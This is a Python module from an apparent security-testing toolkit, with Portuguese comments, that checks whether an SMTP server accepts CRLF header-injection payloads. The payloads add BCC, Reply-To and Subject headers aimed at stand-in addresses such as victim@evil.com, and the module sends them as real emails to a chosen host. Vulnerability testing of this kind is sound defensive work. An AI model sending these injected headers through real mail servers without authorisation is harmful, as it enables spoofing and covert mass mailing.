#!/usr/bin/env python3

"""Modulo de testes de SMTP Header Injection.



Testa se um servidor SMTP permite injetar headers via CRLF em campos de email:

  - To: user\r\nX-Injected: evil@test.com

  - Subject: test\r\nBCC: victim@test.com

  - From: user\r\nReply-To: attacker@test.com

  - Reply-To: campos customizados



Fluxo:

  1. Conecta ao SMTP (porta 25/587/465)

  2. EHLO/HELO

  3. MAIL FROM / RCPT TO (valido)

  4. DATA com campo injetado

  5. Verifica se servidor aceita (250) ou rejeita (501/550)

"""

import argparse
import contextlib
import logging
import smtplib
from collections.abc import Callable
from dataclasses import dataclass
from typing import Any

from mytools.core.base import BaseScanner, ScanGroup
from mytools.core.utils import (
    Cyber,
    color,
    create_banner,
    print_exploit_info,
)

logger = logging.getLogger("mytools.smtpinjection")


_INJECTION_PAYLOADS_DEFAULT = {
    "crlf_header": "\r\nX-Injected-Header: test-injection",
    "crlf_bcc": "\r\nBCC: victim@evil.com",
    "crlf_subject": "\r\nSubject: Injected Subject\r\nX-Fake: yes",
    "crlf_body": "\r\n\r\n<html><body>INJECTED</body></html>",
    "crlf_multi": "\r\nReply-To: evil@attacker.com\r\nBCC: all@targets.com",
}

_INJECTION_FIELDS_DEFAULT = ["To", "Subject", "From", "Reply-To", "CC"]


def _load_smtp_injection() -> tuple[dict[str, str], list[str]]:
    """Carrega SMTP injection data de YAML com fallback."""
    from mytools.data import load_payloads

    data = load_payloads(
        "email",
        "smtp_injection",
        default={
            "injection_payloads": _INJECTION_PAYLOADS_DEFAULT,
            "injection_fields": _INJECTION_FIELDS_DEFAULT,
        },
    )
    return (
        data.get("injection_payloads", _INJECTION_PAYLOADS_DEFAULT),
        data.get("injection_fields", _INJECTION_FIELDS_DEFAULT),
    )


_INJECTION_PAYLOADS, _INJECTION_FIELDS = _load_smtp_injection()


@dataclass(frozen=True, slots=True)
class InjectionAttempt:
    """Resultado de uma tentativa de injecao."""

    field: str

    payload_name: str

    payload: str

    status: str  # injected, blocked, error, timeout

    server_response: str

    error: str


@dataclass(frozen=True, slots=True)
class InjectionResult:
    """Resultado completo da verificacao de injecao."""

    target: str

    port: int

    tls: bool

    banner: str

    ehlo_response: str

    attempts: list[InjectionAttempt]

    vulnerable_fields: list[str]

    issues: list[str]

    overall_status: str = "secure"

    exploit: str = ""

    tool: str = ""


def _connect_smtp(
    target: str, port: int, timeout: float, use_tls: bool
) -> tuple[smtplib.SMTP, str, str]:
    """Conecta ao servidor SMTP e retorna (conexao, banner, ehlo_response)."""

    try:
        server = (
            smtplib.SMTP_SSL(target, port, timeout=timeout)
            if port == 465
            else smtplib.SMTP(target, port, timeout=timeout)
        )

    except smtplib.SMTPConnectError as exc:
        raise ConnectionError(f"Falha ao conectar: {exc}") from exc

    except OSError as exc:
        raise ConnectionError(f"Erro de conexao: {exc}") from exc

    try:
        result = server.ehlo()

    except smtplib.SMTPException as exc:
        server.close()

        raise ConnectionError(f"Falha no EHLO: {exc}") from exc

    banner = result[1].decode("utf-8", errors="replace") if result else ""

    if use_tls and port != 465:
        try:
            server.starttls()

            server.ehlo()

            banner += " [STARTTLS]"

        except smtplib.SMTPNotSupportedError, smtplib.SMTPException, OSError:
            logger.warning("STARTTLS nao suportado")

    return server, banner, banner


def _test_injection(
    server: smtplib.SMTP,
    from_addr: str,
    to_addr: str,
    field: str,
    payload_name: str,
    payload: str,
) -> InjectionAttempt:
    """Testa injecao CRLF em um campo especifico via sendmail raw."""

    raw_email = f"From: {from_addr}\r\nTo: {to_addr}\r\nSubject: SMTP Injection Test\r\n{field}: test-value{payload}\r\n\r\nBody of the test message.\r\n"

    try:
        server.ehlo()

        server.sendmail(from_addr, [to_addr], raw_email.encode("utf-8"))

        return InjectionAttempt(
            field=field,
            payload_name=payload_name,
            payload=payload,
            status="injected",
            server_response="250 OK (sendmail accepted)",
            error="",
        )

    except smtplib.SMTPResponseException as exc:
        status_code = exc.smtp_code

        err_msg = (
            exc.smtp_error
            if isinstance(exc.smtp_error, str)
            else exc.smtp_error.decode("utf-8", errors="replace")
        )

        if status_code in (501, 502, 503, 550, 554, 555, 556):
            return InjectionAttempt(
                field=field,
                payload_name=payload_name,
                payload=payload,
                status="blocked",
                server_response=f"{status_code} {err_msg}",
                error="",
            )

        return InjectionAttempt(
            field=field,
            payload_name=payload_name,
            payload=payload,
            status="error",
            server_response=f"{status_code}",
            error=err_msg,
        )

    except smtplib.SMTPException as exc:
        return InjectionAttempt(
            field=field,
            payload_name=payload_name,
            payload=payload,
            status="error",
            server_response="",
            error=str(exc),
        )

    except OSError as exc:
        return InjectionAttempt(
            field=field,
            payload_name=payload_name,
            payload=payload,
            status="timeout",
            server_response="",
            error=str(exc),
        )


def scan_smtp_injection(
    target: str,
    port: int = 587,
    from_addr: str = "test@example.com",
    to_addr: str = "test@example.com",
    timeout: float = 10.0,
    use_tls: bool = True,
    fields: list[str] | None = None,
) -> InjectionResult:
    """Executa a verificacao de SMTP Header Injection."""

    test_fields = fields or _INJECTION_FIELDS

    attempts: list[InjectionAttempt] = []

    issues: list[str] = []

    banner = ""

    ehlo_response = ""

    tls_used = False

    try:
        server, banner, ehlo_response = _connect_smtp(target, port, timeout, use_tls)

        tls_used = port == 465 or "STARTTLS" in banner

    except ConnectionError as exc:
        issues.append(f"Falha de conexao: {exc}")

        return InjectionResult(
            target=target,
            port=port,
            tls=False,
            banner="",
            ehlo_response="",
            attempts=[],
            vulnerable_fields=[],
            issues=issues,
            overall_status="error",
            exploit="",
        )

    try:
        for field in test_fields:
            for payload_name, payload in _INJECTION_PAYLOADS.items():
                attempt = _test_injection(
                    server, from_addr, to_addr, field, payload_name, payload
                )

                attempts.append(attempt)

                if attempt.status == "injected":
                    issues.append(
                        f"INJECAO DETECTADA: {field} aceitou payload {payload_name}"
                    )

                logger.debug(
                    "field=%s payload=%s status=%s response=%s",
                    field,
                    payload_name,
                    attempt.status,
                    attempt.server_response,
                )

    finally:
        with contextlib.suppress(smtplib.SMTPException):
            server.quit()

    vulnerable_fields = sorted({a.field for a in attempts if a.status == "injected"})

    errored = [a for a in attempts if a.status == "timeout"]

    if not vulnerable_fields:
        if attempts and len(errored) == len(attempts):
            issues.append("Nenhum payload pôde ser testado (erros/timeouts de conexao)")
        else:
            issues.append("Nenhuma injecao detectada — servidor parece seguro")

    overall = (
        "vulnerable"
        if vulnerable_fields
        else "warning"
        if attempts and len(errored) == len(attempts)
        else "secure"
    )

    return InjectionResult(
        target=target,
        port=port,
        tls=tls_used,
        banner=banner[:200],
        ehlo_response=ehlo_response[:200],
        attempts=attempts,
        vulnerable_fields=vulnerable_fields,
        issues=issues,
        overall_status=overall,
        exploit="smtp_header_injection_payload" if vulnerable_fields else "",
        tool="swaks",
    )


def print_results(result: InjectionResult) -> None:
    """Exibe o relatorio de SMTP Header Injection."""

    print(color("\n[+] SMTP Header Injection — Relatorio:", Cyber.GREEN, Cyber.BOLD))

    print(f"  Target: {color(result.target, Cyber.WHITE, Cyber.BOLD)}:{result.port}")

    print(
        f"  TLS: {color('Sim' if result.tls else 'Nao', Cyber.GREEN if result.tls else Cyber.RED)}"
    )

    print()

    if result.banner:
        print(f"  Banner: {color(result.banner[:80], Cyber.CYAN)}")

    print()

    injected = [a for a in result.attempts if a.status == "injected"]

    blocked = [a for a in result.attempts if a.status == "blocked"]

    errors = [a for a in result.attempts if a.status in ("error", "timeout")]

    if injected:
        print(color("  VULNERAVEL — Injecoes detectadas:", Cyber.RED, Cyber.BOLD))

        for a in injected:
            print(
                f"    {color('INJETADO', Cyber.RED, Cyber.BOLD)} {a.field} + {a.payload_name}"
            )

            print(f"      Payload: {a.payload!r}")

            print(f"      Resposta: {a.server_response}")

            print()

            print_exploit_info(result.exploit, result.tool)

    else:
        print(color("  [+] Nenhuma injecao detectada", Cyber.GREEN, Cyber.BOLD))

    if blocked:
        print(color(f"  Bloqueados: {len(blocked)}", Cyber.GREEN))

        for a in blocked:
            print(
                f"    {color('BLOQUEADO', Cyber.GREEN)} {a.field} + {a.payload_name}: {a.server_response}"
            )

    print()

    if errors:
        print(color(f"  Erros/Timeouts: {len(errors)}", Cyber.YELLOW))

        for a in errors:
            print(
                f"    {color('ERRO', Cyber.YELLOW)} {a.field} + {a.payload_name}: {a.error or a.server_response}"
            )

        print()

    if result.vulnerable_fields:
        print(color("  Campos vulneraveis:", Cyber.RED, Cyber.BOLD))

        for f in result.vulnerable_fields:
            print(f"    {color(f, Cyber.RED, Cyber.BOLD)}")

        print()

        print(
            color(
                "  [-] Servidor vulneravel a SMTP Header Injection",
                Cyber.RED,
                Cyber.BOLD,
            )
        )

        print(
            color(
                "  [-] Remedio: Sanitize todos os campos de entrada antes de enviar",
                Cyber.CYAN,
            )
        )

    else:
        print(
            color(
                "  [+] Servidor rejeita injecoes CRLF corretamente",
                Cyber.GREEN,
                Cyber.BOLD,
            )
        )


def banner_art() -> None:
    """Exibe o banner do SMTP Injection."""

    art = r"""

   _____ __  __ ____    _______  ______ ____    ____  _   _ ______    ____

  / ____|  \/  |  _ \  |  ___\ \/ / ___/ ___|  / ___|| | | |  _ \  / ___|

 | (___ | |\/| | |_) | | |_   \  /|  _ \___ \  \___ \| |_| | |_) || |

  \___ \| |  | |  __/  |  _|   / /| |_| |___) |  ___) |  _  |  __/ | |___

  |____/|_|  |_|_|     |_|    /_/  \____/|____/ |____/|_| |_|_|     \____|

"""

    create_banner(art, "   smtp injection: testa injecao de headers CRLF em SMTP")()


async def run_scan(
    target: str,
    port: int,
    from_addr: str,
    to_addr: str,
    timeout: float,
    use_tls: bool,
    fields: list[str],
) -> InjectionResult:
    """Roda o scan de SMTP Header Injection (envolve a funcao sync)."""
    return scan_smtp_injection(
        target=target,
        port=port,
        from_addr=from_addr,
        to_addr=to_addr,
        timeout=timeout,
        use_tls=use_tls,
        fields=fields,
    )


class SmtpinjectionScanner(BaseScanner):
    """SMTP Header Injection — dispatcher BaseScanner (Grupo B)."""

    prog = "mytools-smtpinject"
    description = "SMTP Header Injection — testa injecao CRLF em campos de email."
    prompt = "smtpinject> "
    module_name = "mytools.smtpinjection"
    module_type = "core"
    epilog = "Verifica se o servidor SMTP permite injetar headers extras."
    group = ScanGroup.B
    scan_fn = staticmethod(run_scan)

    def _add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument(
            "target", nargs="?", help="Host SMTP alvo (ex: mail.example.com)."
        )
        parser.add_argument(
            "--port",
            "-p",
            type=int,
            default=587,
            help="Porta SMTP. Padrao: 587",
        )
        parser.add_argument(
            "--from-addr",
            default="test@example.com",
            help="Endereco FROM para os testes. Padrao: test@example.com",
        )
        parser.add_argument(
            "--to-addr",
            default="test@example.com",
            help="Endereco TO para os testes. Padrao: test@example.com",
        )
        parser.add_argument(
            "--no-tls",
            action="store_true",
            help="Nao usar STARTTLS",
        )
        parser.add_argument(
            "--fields",
            default=",".join(_INJECTION_FIELDS),
            help=f"Campos a testar (separados por virgula). Padrao: {','.join(_INJECTION_FIELDS)}",
        )

    def _pre_scan(self, args: argparse.Namespace) -> int | None:
        if not getattr(args, "target", None):
            logger.error("Informe um host SMTP.")
            return 1
        return None

    def _describe_plan(self, args: argparse.Namespace) -> int:
        logger.warning("Nenhuma conexao SMTP sera feita.")
        logger.info("Target: %s:%d", self._get_target(args), args.port)
        return 0

    def _build_run_once_kwargs(self, args: argparse.Namespace) -> dict[str, Any]:
        return {
            "target": self._get_target(args),
            "port": args.port,
            "from_addr": args.from_addr,
            "to_addr": args.to_addr,
            "timeout": args.timeout,
            "use_tls": not args.no_tls,
            "fields": [f.strip() for f in args.fields.split(",") if f.strip()],
        }

    async def run_scan(self, **kwargs: Any) -> Any:
        return await run_scan(**kwargs)  # type: ignore[override]

    def print_results(self, result: object) -> None:
        print_results(result)  # type: ignore[arg-type]

    def _make_banner(self) -> Callable[[], None]:
        return banner_art

    def _example(self) -> str:
        return "mail.example.com --port 587 --from-addr admin@test.com"

    def _help(self) -> str:
        return "Uso: <host> [opcoes]\nExemplos:\n  mail.example.com\n  mail.example.com --port 25 --no-tls\n  mail.example.com --fields To,Subject"


scanner = SmtpinjectionScanner()
main = scanner.main
run_once = scanner.run_once
build_parser = scanner.build_parser

if __name__ == "__main__":
    raise SystemExit(main())
